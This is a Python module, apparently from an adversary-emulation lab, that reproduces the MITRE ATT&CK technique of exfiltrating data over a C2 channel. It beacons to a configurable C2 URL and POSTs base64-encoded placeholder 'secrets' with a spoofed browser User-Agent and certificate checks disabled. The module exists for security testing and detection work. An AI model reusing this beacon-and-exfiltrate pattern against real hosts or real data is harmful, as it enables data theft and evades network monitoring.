"""
campaigns/exfiltration/https_exfil.py — T1041 Exfiltration Over C2 Channel
MITRE ATT&CK: T1041 | Tactic: Exfiltration
"""

import os
import json
import base64
import requests
from datetime import datetime
from campaigns.base_campaign import BaseCampaign


class HttpsExfilCampaign(BaseCampaign):
    TECHNIQUE_ID = "T1041"
    TECHNIQUE_NAME = "Exfiltration Over C2 Channel"
    TACTIC = "Exfiltration"

    C2_URL = os.environ.get("C2_URL", "https://c2.lab.local/collect")
    BEACON_INTERVAL = int(os.environ.get("BEACON_INTERVAL", "5"))

    def run(self) -> dict:
        self.log_step("init", f"Establishing C2 channel to {self.C2_URL}")
        self.simulate_delay(1)

        # Step 1: C2 beacon
        beacon_result = self._beacon()
        self.log_step("c2_beacon", f"Beacon: {beacon_result['status']}", beacon_result["status"])
        self.simulate_delay(1)

        # Step 2: Collect and exfiltrate data
        payload = self._collect_sensitive_data()
        self.log_step("data_collection", f"Collected {len(payload)} bytes of lab data")

        exfil_result = self._exfiltrate(payload)
        self.log_step("https_exfil", f"Exfiltration: {exfil_result['status']}", exfil_result["status"])

        results = {
            "technique": self.TECHNIQUE_ID,
            "c2_url": self.C2_URL,
            "beacon": beacon_result,
            "exfil": exfil_result,
            "timestamp": datetime.utcnow().isoformat(),
        }
        self.save_artifact("https_exfil_results.json", json.dumps(results, indent=2))
        return self.build_result(True, "HTTPS C2 exfiltration demonstrated")

    def _beacon(self) -> dict:
        try:
            resp = requests.get(self.C2_URL, timeout=3, verify=False)
            return {"status": "connected", "http_status": resp.status_code}
        except Exception:
            return {"status": "simulated", "note": "C2 server not reachable — simulating for lab"}

    def _collect_sensitive_data(self) -> bytes:
        data = {
            "hostname": "victim-web",
            "user": "www-data",
            "secrets": "LAB-DEMO-ONLY-NOT-REAL-CREDENTIALS",
            "files": ["/etc/passwd (simulated)", "/var/www/html/config.php (simulated)"],
            "timestamp": datetime.utcnow().isoformat(),
        }
        return base64.b64encode(json.dumps(data).encode())

    def _exfiltrate(self, payload: bytes) -> dict:
        try:
            resp = requests.post(
                self.C2_URL,
                data={"data": payload.decode()},
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
                timeout=3,
                verify=False,
            )
            return {"status": "sent", "bytes": len(payload), "http_status": resp.status_code}
        except Exception:
            return {"status": "simulated", "bytes": len(payload), "note": "Simulated for lab safety"}
